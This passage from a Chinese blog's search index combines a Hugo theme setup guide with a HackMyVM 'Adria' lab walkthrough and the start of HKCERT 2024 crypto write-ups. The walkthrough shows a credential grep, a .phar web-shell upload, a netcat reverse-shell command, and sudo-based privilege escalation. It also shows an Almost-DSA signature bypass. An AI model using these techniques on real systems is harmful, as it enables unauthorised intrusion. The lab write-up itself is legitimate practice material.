#gitRepo = \"\" # LoveIt 新增 | 0.1.1 哪种哈希函数用来 SRI, 为空时表示不使用 SRI # [\"sha256\", \"sha384\", \"sha512\", \"md5\"] fingerprint = \"sha256\" # LoveIt 新增 | 0.2.0 日期格式 dateFormat = \"2006-01-02\" # 网站标题, 用于 Open Graph 和 Twitter Cards title = \"Stilig的博客\" # 网站描述, 用于 RSS, SEO, Open Graph 和 Twitter Cards description = \"Stilig的博客\" # 网站图片, 用于 Open Graph 和 Twitter Cards images = [\"首页中间的图片\"] # 页面头部导航栏配置 [params.header] # 桌面端导航栏模式 [\"fixed\", \"normal\", \"auto\"] desktopMode = \"normal\" # 移动端导航栏模式 [\"fixed\", \"normal\", \"auto\"] mobileMode = \"normal\" # LoveIt 新增 | 0.2.0 页面头部导航栏标题配置 [params.header.title] # LOGO 的 URL logo = \"\" # 标题名称 name = \"Stilig\" # 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标 pre = \"\" # 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标 post = \"\" # LoveIt 新增 | 0.2.5 是否为标题显示打字机动画 typeit = false # 页面底部信息配置 [params.footer] enable = true # LoveIt 新增 | 0.2.0 自定义内容 (支持 HTML 格式) custom = '' # LoveIt 新增 | 0.2.0 是否显示 Hugo 和主题信息 hugo = false # LoveIt 新增 | 0.2.0 是否显示版权信息 copyright = true # LoveIt 新增 | 0.2.0 是否显示作者 author = true # 网站创立年份 since = 2022 # ICP 备案信息，仅在中国使用 (支持 HTML 格式) icp = '' # 许可协议信息 (支持 HTML 格式) license = '\u003ca rel=\"license external nofollow noopener noreffer\" href=\"https://creativecommons.org/licenses/by-nc/4.0/\" target=\"_blank\"\u003eCC BY-NC 4.0\u003c/a\u003e' # LoveIt 新增 | 0.2.0 Section (所有文章) 页面配置 [params.section] # section 页面每页显示文章数量 paginate = 20 # 日期格式 (月和日) dateFormat = \"01-02\" # RSS 文章数目 rss = 10 # LoveIt 新增 | 0.2.0 List (目录或标签) 页面配置 [params.list] # list 页面每页显示文章数量 paginate = 20 # 日期格式 (月和日) dateFormat = \"01-02\" # RSS 文章数目 rss = 10 # LoveIt 新增 | 0.2.0 应用图标配置 [params.app] # 当添加到 iOS 主屏幕或者 Android 启动器时的标题, 覆盖默认标题 title = \"\" # 是否隐藏网站图标资源链接 noFavicon = false # 更现代的 SVG 网站图标, 可替代旧的 .png 和 .ico 文件 svgFavicon = \"\" # Android 浏览器主题色 themeColor = \"#ffffff\" ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:1","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"windows\u0026linux 如果你是这两个系统，直接去官网https://gohugo.io/installation/ ，当然Linux应该是可以直接apt的,其他的和mac一样 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:1:2","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"hugo完善 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:0","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"前提 把自己的hugo.toml里面的个人信息和网站信息配置好了，要不然会很乱。 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:1","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"文章模板 在你的mysite/archetypes/default.md文件里添加以下内容： --- title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" subtitle: \"\" date: {{ .Date }} lastmod: {{ .Date }} draft: true author: \"\" authorLink: \"\" license: \"\" tags: [\"\"] categories: [\"\"] featuredImage: \"\" featuredImagePreview: \"\" summary: \"\" hiddenFromHomePage: false hiddenFromSearch: false toc: enable: true auto: true mapbox: share: enable: true comment: enable: true --- 这是我个人比较喜欢的模板，你可以根据自己的喜好修改。 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:2","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"添加统计功能 在your_site\\layouts\\partials\\plugin\\下创建busuanzi.html文件，写入 {{ if .params.enable }} {{ if eq .bsz_type \"footer\" }} {{/* 只有 footer 才刷新，防止页面进行多次调用，计数重复; 只要启用就计数，显示与否看具体设置 */}} \u003cscript async src=\" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js \"\u003e\u003c/script\u003e {{ end }} {{ if or (eq .params.site_pv true) (eq .params.site_uv true) (eq .params.page_pv true) }} {{ if eq .bsz_type \"footer\" }} \u003csection\u003e {{ if eq .params.site_pv true }} \u003cspan id=\"busuanzi_container_value_site_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_pv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} {{ if and (eq .params.site_pv true) (eq .params.site_uv true) }} \u0026nbsp;|\u0026nbsp; {{ end }} {{ if eq .params.site_uv true }} \u003cspan id=\"busuanzi_container_value_site_uv\"\u003e {{- with .params.site_uv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_site_uv\"\u003e\u003c/span\u003e \u003c/span\u003e {{ end }} \u003c/section\u003e {{ end }} {{/* page pv 只在 page 显示 */}} {{ if and (eq .params.page_pv true) (eq .bsz_type \"page-reading\") }} \u003cspan id=\"busuanzi_container_value_page_pv\"\u003e {{- with .params.page_pv_pre -}} {{ . | safeHTML }} {{ end }} \u003cspan id=\"busuanzi_value_page_pv\"\u003e\u003c/span\u003e\u0026nbsp; {{- T \"views\" -}} \u003c/span\u003e {{ end }} {{ end }} {{ end }} 然后在hugo.toml里添加 # 添加不蒜子计数 [params.busuanzi] enable = true # 是否开启全站独立访客数 site_uv = true # 全站独立访客数前的图标或提示语 site_uv_pre = '\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e' # 全站独立访客数后的图标或提示语 site_uv_post = '' # 是否开启全站浏览量 site_pv = true # 全站浏览量前的图标或提示语 site_pv_pre = '\u003ci class=\"fa fa-eye\"\u003e\u003c/i\u003e' # 全站浏览量后的图标或提示语 site_pv_post = '' # 是否开启单页浏览量 page_pv = true # 单页浏览量前的图标或提示语 page_pv_pre = '\u003ci class=\"far fa-eye fa-fw\"\u003e\u003c/i\u003e' # 单页浏览量后的图标或提示语 page_pv_post = '' 页脚统计 把your_site\\themes\\LoveIt\\layouts\\partials\\footer.html复制粘贴到路径your_site\\layouts\\partials\\下。 再修改文件your_site\\layouts\\partials\\footer.html，在最后三行 \u003c/div\u003e \u003c/footer\u003e {{- end -}} 前面添加 {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.busuanzi \"bsz_type\" \"footer\") -}} 然后你就无敌了 文章统计 把your_site\\themes\\LoveIt\\layouts\\posts\\single.html复制粘贴到路径your_site\\layouts\\posts\\下。再在your_site\\layouts\\posts\\single.html中找到第二个标签，并在该标签下添加下面的代码 {{- /* busuanzi plugin */ -}} {{- partial \"plugin/busuanzi.html\" (dict \"params\" .Site.Params.busuanzi \"bsz_type\" \"page-reading\") -}} ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:3","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"文章加密 如果文章不想给别人看，但是自己又写完了，哎，这就很烦，怎么办呢，单独页面加密就好了 将your_site\\themes\\LoveIt\\layouts\\posts\\single.html复制粘贴到your_site\\layouts\\posts\\路径下。打开your_site\\layouts\\posts\\single.html文件，在{{- $params := .Scratch.Get “params” -}}下添加下面内容： {{- $password := $params.password | default \"\" -}} {{- if ne $password \"\" -}} \u003cscript\u003e (function(){ if({{ $password }}){ if (prompt('请输入文章密码') != {{ $password }}){ alert('密码错误！'); if (history.length === 1) { window.opener = null; window.open('', '_self'); window.close(); } else { history.back(); } } } })(); \u003c/script\u003e {{- end -}} 之后我们只要将 password 参数添加到文章头即可。 但为了方便起见，我这里直接把它加到了模板文件中，即在博客的根目录下找到your_site\\archetypes\\default.md并打开，把 password 参数添加进去，如下代码块： --- title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" slug: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" ... ... password: \"\" ... ... --- ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:4","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"修改二级标题，行内代码和分割线等样式 二级标题的修改 原主题的二级标题我不好评价，它跟下一级的标题几乎区分不开，这导致文章看起来没有条理。因此在这里我们将修改二级标题的样式以做区分。 找到your_site\\assets\\css_custom.scss文件，在里面添加如下内容： /* 标题 */ .page.single h2 { box-shadow: rgb(95, 90, 75) 0px 0px 0px 1px, rgba(10, 10, 0, 0.5) 1px 1px 6px 1px; color: rgb(255, 255, 255); font-family: 微软雅黑, 宋体, 黑体, Arial; font-weight: bold; line-height: 1.3; text-shadow: rgb(34, 34, 34) 2px 2px 3px; background: rgb(43, 102, 149); border-radius: 6px; border-width: initial; border-style: none; border-color: initial; border-image: initial; padding: 7px; margin: 18px 0px 18px -5px !important; } 行内代码 原主题的行内代码能用，但只能用一点点，实在是与正文区分不开，所以在这修改一下它的样式。 找到your_site\\assets\\css_custom.scss文件，在里面添加如下内容： /* 行内代码块 */ code { margin: 0 .2rem; font-size: .9em; border: 1px solid #d6d6d6; border-radius: .2rem; } /* 预格式代码块(用tab键插入的代码块) */ pre code { margin: 0; border: none; font-size: .875rem; } /* 标题里的代码块样式 */ .page.single .content\u003eh2 code { color: #f7ab01; background: transparent !important; border: none; } 分割线 在原主题中分割线几乎看不到，这里修改一下。 找到your_site\\assets\\css_custom.scss文件，在里面添加如下内容： /* 分隔线 */ hr { border: none; border-bottom: 2px dashed #7a7a7a !important; } 页脚分割线 页脚内容与其他内容连在一起有点杂乱，因此添加一个页脚的分割线还是很有必要的。 找到your_site\\assets\\css_custom.scss文件，在里面添加如下内容： /* 页脚分割线 */ .footer { display: block; border-top-width: 3px; border-top-style: solid; border-top-color: #96c1db; position: relative; z-index: -1; max-width: 800px; width: 60%; margin: .5rem auto 0 auto; padding-left: 0rem; padding-right: 0rem; } @media only screen and (max-width: 1440px) { .footer { width:54.5% } } @media only screen and (max-width: 1200px) { .footer { width:50.5% } } @media only screen and (max-width: 960px) { .footer { width: 77% } } @media only screen and (max-width: 680px) { .footer { width: 95% } } ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:5","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"友链 添加友链卡片 添加friend.html文件 在your_site\\layouts\\shortcodes\\路径下，新创建文件friend.html，并且在里面添加如下内容： {{ if .IsNamedParams }} {{- $src := .Get \"logo\" -}} {{- $small := .Get \"logo_small\" | default $src -}} {{- $large := .Get \"logo_large\" | default $src -}} \u003cdiv class=\"friend-div\"\u003e \u003ca target=\"_blank\" href={{ .Get \"url\" | safeURL }} title={{ .Get \"name\" }} \u003e \u003cimg class=\"lazyload\" src=\"/svg/loading.min.svg\" data-src={{ $src | safeURL }} alt={{ .Get \"name\" }} data-sizes=\"auto\" data-srcset=\"{{ $small | safeURL }}, {{ $src | safeURL }} 1.5x, {{ $large | safeURL }} 2x\" /\u003e \u003cspan class=\"friend-name\"\u003e{{ .Get \"name\" }}\u003c/span\u003e \u003cspan class=\"friend-info\"\u003e{{ .Get \"word\" }}\u003c/span\u003e \u003c/a\u003e \u003c/div\u003e {{ end }} 添加_friend.scss文件 在your_site\\assets\\css_partial_single\\路径下（如果没有就自己创建），新建文件_friend.scss，并在里面添加如下内容： #article-container { word-wrap: break-word; overflow-wrap: break-word } #article-container a { color: #49b1f5 } #article-container a:hover { text-decoration: underline } #article-container img { margin: 0 auto .8rem } .flink#article-container .friend-list-div \u003e .friend-div a .friend-info, .flink#article-container .friend-list-div \u003e .friend-div a .friend-name { overflow: hidden; -o-text-overflow: ellipsis; text-overflow: ellipsis; white-space: nowrap } .flink#article-container .friend-list-div { overflow: auto; padding: 10px 10px 0; text-align: center; } .flink#article-container .friend-list-div \u003e .friend-div { position: relative; float: left; overflow: hidden; margin: 15px 7px; width: calc(100% / 3 - 15px); height: 90px; border-radius: 8px; line-height: 17px; -webkit-transform: translateZ(0) } @media screen and (max-width: 1100px) { .flink#article-container .friend-list-div \u003e .friend-div { width: calc(50% - 15px) !important } @media screen and (max-width: 600px) { .flink#article-container .friend-list-div \u003e .friend-div { width: calc(100% - 15px) !important } } } .flink#article-container .friend-list-div \u003e .friend-div:hover { background: rgba(87, 142, 224, 0.15); } .flink#article-container .friend-list-div \u003e .friend-div:hover img { -webkit-transform: rotate(360deg); -moz-transform: rotate(360deg); -o-transform: rotate(360deg); -ms-transform: rotate(360deg); transform: rotate(360deg) } .flink#article-container .friend-list-div \u003e .friend-div:before { position: absolute; top: 0; right: 0; bottom: 0; left: 0; z-index: -1; background: var(--text-bg-hover); content: ''; -webkit-transition: -webkit-transform .3s ease-out; -moz-transition: -moz-transform .3s ease-out; -o-transition: -o-transform .3s ease-out; -ms-transition: -ms-transform .3s ease-out; transition: transform .3s ease-out; -webkit-transform: scale(0); -moz-transform: scale(0); -o-transform: scale(0); -ms-transform: scale(0); transform: scale(0) } .flink#article-container .friend-list-div \u003e .friend-div:hover:before, .flink#article-container .friend-list-div \u003e .friend-div:focus:before, .flink#article-container .friend-list-div \u003e .friend-div:active:before { -webkit-transform: scale(1); -moz-transform: scale(1); -o-transform: scale(1); -ms-transform: scale(1); transform: scale(1) } .flink#article-container .friend-list-div \u003e .friend-div a { color: var(--font-color); text-decoration: none } .flink#article-container .friend-list-div \u003e .friend-div a img{ float: left; margin: 15px 10px; width: 60px; height: 60px; border-radius: 35px; -webkit-transition: all .3s; -moz-transition: all .3s; -o-transition: all .3s; -ms-transition: all .3s; transition: all .3s } .flink#article-container .friend-list-div \u003e .friend-div a .friend-name { display: block; padding: 16px 10px 0 0; height: 40px; font-weight: 700; font-size: 20px } .flink#article-container .friend-list-div \u003e .friend-div a .friend-info { display: block; padding: 1px 10px 1px 0; height: 50px; font-size: 13px } 在_single.scss中引入代码 把your_site\\themes\\LoveIt\\assets\\css_page_single.scss复制粘贴到路径your_site\\assets\\css_page\\下。 再在文件your_site\\assets\\css_page_single.scss里添加如下内容： @import \"../_partial/_single/friend\"; 创建友链页面 创建friend/index.md文件 先new一个 hugo new friend/index.md 写入 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:2:6","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["blog"],"content":"部署到服务器 因为我用的是服务器部署，这里只说服务器的方法 安装宝塔（方便，且适合所有人） 创建一个网站，并把网站根目录指向你的hugo生成的public文件夹 同步 我采用的本地编写，编译后用rsync同步到服务器 不断更新维护即可 ","date":"2025-02-25","objectID":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/:3:0","tags":["hugo"],"title":"Hugo搭建以及主题完善","uri":"/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/"},{"categories":["靶场"],"content":"HMV Adria ","date":"2025-02-25","objectID":"/hmv_adria/:1:0","tags":["渗透"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Adria ","date":"2025-02-25","objectID":"/hmv_adria/:1:1","tags":["渗透"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.102 08:00:27:96:ce:01 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT Nmap scan report for 192.168.31.102 Host is up (0.0014s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0) | ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA) |_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Did not follow redirect to http://adria.hmv/ | http-robots.txt: 7 disallowed entries | /backup/ /cron/? /front/ /install/ /panel/ /tmp/ |_/updates/ |_http-server-header: Apache/2.4.57 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 我说直接curl80没有东西，他有个重定向，写入到/etc/hosts，然后访问就行了 扫一下目录 ┌──(kali㉿kali)-[~] └─$ dirsearch -u http://192.168.31.102 -i 200,301 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 Wordlist size: 11460 Output File: /home/kali/reports/http_192.168.31.102/_25-02-24_22-30-28.txt Target: http://192.168.31.102/ [22:30:28] Starting: [22:30:39] 200 - 247B - /.gitignore [22:31:41] 200 - 15KB - /changelog.txt [22:31:47] 200 - 4KB - /CONTRIBUTING.md [22:31:58] 200 - 851B - /favicon.ico [22:32:13] 200 - 12KB - /license.txt [22:32:29] 200 - 1KB - /panel.php [22:32:29] 200 - 1KB - /panel.aspx [22:32:30] 200 - 1KB - /panel.jsp [22:32:30] 200 - 1KB - /panel.html [22:32:30] 200 - 1KB - /panel/ [22:32:44] 200 - 5KB - /README.md [22:32:47] 200 - 94B - /robots.txt [22:32:55] 200 - 212B - /sitemap.xml Task Completed /panel.php是后台页面，最有用的信息\" Powered by Subrion CMS v4.2.1\" ","date":"2025-02-25","objectID":"/hmv_adria/:1:2","tags":["渗透"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["靶场"],"content":"反弹shell smb启动看看 ┌──(kali㉿kali)-[~] └─$ smbclient -L //192.168.31.102 -N Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers DebianShare Disk IPC$ IPC IPC Service (Samba 4.17.12-Debian) nobody Disk Home Directories Reconnecting with SMB1 for workgroup listing. smbXcli_negprot_smb1_done: No compatible protocol selected by server. Protocol negotiation to server 192.168.31.102 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE Unable to connect with SMB1 -- no workgroup available ┌──(kali㉿kali)-[~/Desktop] └─$ smbclient //192.168.31.102/DebianShare Password for [WORKGROUP\\kali]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Dec 4 17:32:45 2023 .. D 0 Sat Jul 22 16:10:13 2023 configz.zip N 2756857 Mon Nov 6 23:56:25 2023 19480400 blocks of size 1024. 15686980 blocks available smb: \\\u003e get configz.zip getting file \\configz.zip of size 2756857 as configz.zip (26655.8 KiloBytes/sec) (average 26655.9 KiloBytes/sec) smb: \\\u003e 看看zip里面有什么，解压看看 ┌──(kali㉿kali)-[~/Desktop] └─$ cd configz ┌──(kali㉿kali)-[~/Desktop/configz] └─$ ls boot isolinux preseed ┌──(kali㉿kali)-[~/Desktop/configz] └─$ grep -r \"user\" preseed/master.preseed:d-i passwd/user-fullname string admin preseed/master.preseed:d-i passwd/username string admin preseed/master.preseed:d-i passwd/user-password password jojo1989 preseed/master.preseed:d-i user-setup/allow-password-weak boolean true preseed/master.seed:# To create a normal user account. preseed/master.seed:d-i passwd/user-fullname string Adam Lewis preseed/master.seed:d-i passwd/username string alewis preseed/master.seed:# Normal user's password, either in clear text preseed/master.seed:#d-i passwd/user-password password insecure preseed/master.seed:#d-i passwd/user-password-again password insecure preseed/master.seed:d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268 preseed/master.seed:# Create the first user with the specified UID instead of the default. preseed/master.seed:d-i passwd/user-uid string 1010 preseed/master.seed:#d-i user-setup/allow-password-weak boolean true grep: boot/grub/x86_64-efi/legacycfg.mod: binary file matches grep: boot/grub/x86_64-efi/read.mod: binary file matches grep: boot/grub/x86_64-efi/password.mod: binary file matches grep: boot/grub/x86_64-efi/password_pbkdf2.mod: binary file matches grep: boot/grub/x86_64-efi/bsd.mod: binary file matches grep: boot/grub/efi.img: binary file matches grep: isolinux/libcom32.c32: binary file matches isolinux/ks.cfg:#Initial user isolinux/ks.cfg:user cscience --fullname \"Coin Science\" --iscrypted --password $1$cw7eQ/70$/8ZeZKBBBJPtIFdnibj/X/ grep: isolinux/en.hlp: binary file matches grep: isolinux/nb.tr: binary file matches isolinux/f9.txt:and the next user who comes up with the same problem will profit from your grep: isolinux/ldlinux.c32: binary file matches grep: isolinux/bootlogo: binary file matches grep: isolinux/si.hlp: binary file matches grep: isolinux/ka.hlp: binary file matches 利用grep直接查找想要的信息admin/jojo1989 进入后台，查找cms对应版本漏洞，是文件上传.phar，传个一句话木马上去 http://192.168.31.102/uploads/shell.phar?cmd=nc%20-e%20/bin/bash%20192.168.31.183%204444 顺便/usr/bin/script -qc /bin/bash /dev/null拉个交互式终端 ","date":"2025-02-25","objectID":"/hmv_adria/:1:3","tags":["渗透"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["靶场"],"content":"提权 先看看这个能干啥 www-data@adria:/var/www/html/uploads$ sudo -l sudo -l sudo: unable to resolve host adria: No address associated with hostname Matching Defaults entries for www-data on adria: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User www-data may run the following commands on adria: (adriana) NOPASSWD: /usr/bin/scalar scalar虽然自身没有直接执行命令的能力，但是可以通过手动输入脚本然后像python那样逐行解释运行。 可以在该工具的交互式输入!sh来获取adriana用户的shell sudo -u adriana /usr/bin/scalar list 得到用户权限和flag sudo -l sudo: unable to resolve host adria: No address associated with hostname Matching Defaults entries for adriana on adria: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User adriana may run the following commands on adria: (ALL : ALL) NOPASSWD: /opt/backup 这次可以执行的是个backup cat /opt/backup #!/bin/bash PASSWORD=$(/usr/bin/cat /root/pass) read -ep \"Password: \" USER_PASS if [[ $PASSWORD == $USER_PASS ]] ; then /usr/bin/echo \"Authorized access\" /usr/bin/sleep 1 /usr/bin/zip -r -e -P \"$PASSWORD\" /opt/backup.zip /var/www/html else /usr/bin/echo \"Access denied\" exit 1 fi 这个脚本有一个问题，就是第7行的 $PASSWORD == $USER_PASS 两个变量都没有加上引号，呈现上就是如果输入通配符或者？的话会直接匹配成真, 所以我们对于backup这个脚本也只需要输入即可。只不过密码不会直接打印出来，需要起另一个进程监视后台即可 watch -n 0.1 -d “ps aux | grep -ai /usr/bin/zip” 得到密码 ","date":"2025-02-25","objectID":"/hmv_adria/:1:4","tags":["渗透"],"title":"HMV Adria","uri":"/hmv_adria/"},{"categories":["CTF"],"content":"前言 距离初赛过了好久好久，复现一直没咋搞，nss上有环境，最近复现一下，主要是那几个lcg和rsa ","date":"2025-02-24","objectID":"/hkcert2024/:1:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"题目 ","date":"2025-02-24","objectID":"/hkcert2024/:2:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"Almost DSA task import os from Crypto.Util.number import getPrime as get_prime from Crypto.Util.number import isPrime as is_prime import secrets import hashlib # Computes the inverse of a mod prime p def inverse(a, p): return pow(a, p-2, p) def hash(m): h = hashlib.sha256(m).digest() return int.from_bytes(h, 'big') def generate_parameters(): # FIPS 186-4 specifies that p and q can be of (2048, 256) bits while True: q = get_prime(256) r = secrets.randbits(2048-256) p = r*q + 1 if p.bit_length() != 2048: continue if not is_prime(p): continue break h = 1 while True: h += 1 g = pow(h, (p-1)//q, p) if g == 1: continue break return p, q, g def sign(params, x, m): p, q, g = params k = secrets.randbelow(q) r = pow(g, k, p) % q s = inverse(k, q) * (hash(m) + x*r) % q return (r, s) def verify(params, y, m, sig): p, q, g = params r, s = sig assert 0 \u003c r \u003c p assert 0 \u003c s \u003c p w = inverse(s, q) u1 = hash(m) * w % q u2 = r * w % q v = pow(g, u1, p) * pow(y, u2, p) % p % q assert v == r def main(): # The parameters were generated by generate_parameters(), which will take some time to generate. # With that reason, we will use a fixed one instead of a random one. p = 17484281359996796703320753329289113133879315487679543624741105110874484027222384531803606958810995970161525595158267517181794414300756262340838882222415769778596720783078367872913954804658072233160036557319401158197234539657653635114116129319712841746177858547689703847179830876938850791424742190500438426350633498257950965188623233005750174576134802300600490139756306854032656842920490457629968890761814183283863329460516285392831741363925618264196019954486854731951282830652117210758060426483125525221398218382779387124491329788662015827601101640859700613929375036792053877746675842421482667089024073397901135900307 q = 113298192013516195145250438847099037276290008150762924677454979772524099733149 g = 2240914810379680126339108531401169275595161144670883986559069211999660898639987625873945546061830376966978596453328760234030133281772778843957617704660733666090807506024220142764237508766050356212712228439682713526208998745633642827205871276203625236122884797705545378063530457025121059332887929777555045770309256917282489323413372739717067924463128766609878574952525765509768641958927377639405729673058327662319958260422021309804322093360414034030331866591802559201326691178841972572277227570498592419367302032451643108376739154217604459747574970395332109358575481017157712896404133971465638098583730000464599930248 print(f'{p = }') print(f'{q = }') print(f'{g = }') x = secrets.randbelow(q) y = pow(g, x, p) print(f'{y = }') m = b'gib flag' r = int(input('r = ')) s = int(input('s = ')) verify((p, q, g), y, m, (r, s)) flag = os.getenv('FLAG', 'hkcert24{***REDACTED***}') print(flag) if __name__ == '__main__': main() 比赛的时候以为是一个很复杂的根据dsa原理去做的题目，后面发现自己还是太蠢了，只要取一对正确的rs值就行了，其实就是在找他这个密码题的漏洞，r=1时s=q即符合要求 ","date":"2025-02-24","objectID":"/hkcert2024/:2:1","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"Mask-mask-RSA task from Crypto.Util.number import getPrime, bytes_to_long FLAG = b'flag{this_is_a_test_flag}' def mask_expr(expr): global e, n assert '**' not in expr, \"My computer is weak, I can't handle this insane calculation\" assert len(expr) \u003c= 4, \"Too long!\" assert all([c in r'pq+-*/%' for c in expr]), \"Don't try to break me\" res = eval(expr) 